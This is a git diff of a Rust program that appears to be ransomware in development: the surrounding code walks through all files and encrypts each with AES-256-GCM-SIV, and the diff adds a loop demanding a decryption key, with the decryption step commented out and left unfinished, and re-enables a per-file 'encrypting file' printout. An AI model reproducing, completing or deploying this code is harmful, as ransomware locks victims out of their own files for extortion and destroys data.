@@ -51,6 +51,27 @@ fn main() {
     writeln!(key_file.as_ref().unwrap(), "key: {:?}", hex::encode(&key));
 
     traverse(true, &cipher); //iterates through all the files and calls the encrypt function on each one
+                             //
+    loop {
+        let mut user_input = String::new();
+        println!("Enter decryption key pls: ");
+        io::stdin().read_line(&mut user_input).unwrap();
+        let user_input_str = user_input.as_bytes(); //convert to bytes
+
+        //TODO: UP TO HERE TODAY
+        //key length 32, nonce length 12
+        if user_input_str.len() != 32 {
+            //print error
+            println!("Invalid key length")
+        } else {
+            // //FIXME: convert byte array into key format why this no work
+            // //WHY THIS NO WORK
+            // let user_key = GenericArray::clone_from_slice(&user_input_str[0..32]);
+            // //decrypt using the key
+            // let plaintext = cipher.decrypt(nonce, ciphertext.unwrap().as_ref());
+        }
+        //only break the loop when the correct key is entered
+    }
 }
 
 fn display_message() {
@@ -170,7 +191,7 @@ fn encrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), std::io::Error> {
     //open existing "C:\\Users\\win11\\Desktop\\output.txt" and write the path to it
     // Open a file with append option
 
-    // println!("encrypting file: {}", path.display()); //FIXME: error testing
+    println!("encrypting file: {}", path.display()); //FIXME: error testing
 
     let mut file = File::open(path)?;
     let mut buffer = Vec::new();
